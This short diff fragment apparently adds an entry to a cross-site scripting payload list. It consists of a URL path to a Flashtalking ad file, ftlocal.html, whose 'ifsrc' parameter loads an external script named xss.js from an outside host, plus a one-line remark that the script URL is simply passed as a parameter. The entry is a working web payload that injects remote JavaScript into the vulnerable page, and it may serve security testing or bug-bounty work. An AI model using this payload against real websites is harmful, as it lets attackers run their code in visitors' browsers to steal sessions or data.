@@ -1,0 +1,3 @@
+/flashtalking/ftlocal.html?ifsrc=https://bgtian.life/xss.js
+
+url of script is simply pass as param
